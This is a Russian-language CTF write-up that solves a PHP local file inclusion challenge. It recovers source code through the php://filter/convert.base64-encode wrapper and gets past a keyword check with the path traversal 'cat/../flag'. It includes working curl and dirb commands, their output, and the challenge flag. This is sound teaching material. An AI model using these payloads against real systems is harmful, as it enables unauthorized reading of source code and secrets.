# Решение

Можно заметить, что при нажатии на кнопки выбора, в URL подставляется параметр `?view=...`, из вариантов дается cat и dog. 

А что, если я хочу домашнюю лошадь? Подставляем в параметр `horse`, но получаем в ответ лишь 
`🤔 Мы не нашли вам питомца... Поищите собак или кошек`

Дальше у вас есть 2 пути:

### 1a. Экспериментальный (рекомендуется)

Подставляем в параметр `cats` вместо `cat` и получаем ошибку:
```
Warning: include(cats.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 33


Warning: include(): Failed opening 'cats.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 33
```

Становится понятно, что
- `cat` и `dog` это файлы `cat.php` и `dog.php`, которые нам и выводят картинки. Их импортирует `index.php`
- Используется какая-то проверка для определения наличия слов `cat` или `dog` в параметре
- В конец добавляется расширение `.php`

### 1b. Брутфорс пути через dirb/gobuster и подобные

Молодцы, нашли `cat.php`, `dog.php`, `index.php` и `flag.php` за счет 
```bash
dirb http://.../ -X .php
```
Перешли по ссылкам и увидели те же картинки, а значит `index.php` делает инклюд `dog.php` и `cat.php`

### 2. Читаем файлы

Нам нужно прочитать исходный код сайта, чтобы понять, как он работает, и где искать флаг. Для этого воспользуемся
непопулярной особенностью языка PHP: фильтры.

В PHP, при чтении файлов можно указывать ресурсы вроде `http://`, `file://` и прочие. Одним из них является `filter://`,
который проводит какие-либо операции перед выводом данных или сохранения их в переменную. Например:
```php
<?php
    // Содержимое hello.txt: Hello, vrnctf!
    echo file_get_contents('php://filter/string.toupper/resource=hello.txt');
    // Выведет: HELLO, VRNCTF!
?>
```

Среди всех фильтров, есть такой, который нам поможет легко прочитать исходный код, не выполняя его:
```
php://filter/convert.base64-encode/resource=...
```

Применяем его, учитывая проверку наличия `cat` или `dog` в строке, и...
```bash
$ curl 'http://URL/?view=php://filter/convert.base64-encode/resource=cat'
...
PGltZyBjbGFzcz0idy0yLzMiIHNyYz0iaW1nL2NhdHMvPD9waHAgIGVjaG8gcmFuZCgxLDEwKTsgPz4uanBnIiAvPg0KPD9waHANCi8vINCa0L7RgtGLINCyINC70Y7QsdC+0Lwg0YHQu9GD0YfQsNC1INC70YPRh9GI0LUgKNCh0L/QsNGB0LjRgtC1ISDQnNC10L3RjyDQtNC10YDQttCw0YIg0LIg0LfQsNC70L7QttC90LjQutCw0YUsINGPINC+0YHRgtCw0LLQuNC7INCy0LDQvCBmbGFnLnBocCDQv9C+0LrQsCDQstGB0LUg0LXRidC1INC20LjQsiwg0LLRgdGPINC90LDQtNC10LbQtNCwINC90LAg0LLQsNGBKQ0KPz4=    
...
```

Декодируем Base64 строку и получаем код:
```php
<img class="w-2/3" src="img/cats/<?php  echo rand(1,10); ?>.jpg" />
<?php
// Коты в любом случае лучше (Спасите! Меня держат в заложниках, я оставил вам flag.php пока все еще жив, вся надежда на вас)
?>
```

Проводим такую же манипуляцию для чтения файла `flag.php`:
```bash
$ curl 'http://URL/?view=php://filter/convert.base64-encode/resource=cat/../flag'
...
PD9waHANCi8vIHZybmN0ZntGMWx0M3IxbmdfRDBuM193cjBuZ30NCmVjaG8gJ1NvIG5lYXIsIHlldCBzb21laG93IG91dCBvZiByZWFjaCc7DQo/Pg==
...
```

И получаем
```php
<?php
// vrnctf{F1lt3r1ng_D0n3_wr0ng}
echo 'So near, yet somehow out of reach';
?>
```

> Здесь мы применили обход проверки наличия `cat` в строке: `cat/../flag`, в итоге проверка пройдена, а файловая система
> упрощает путь до `./flag`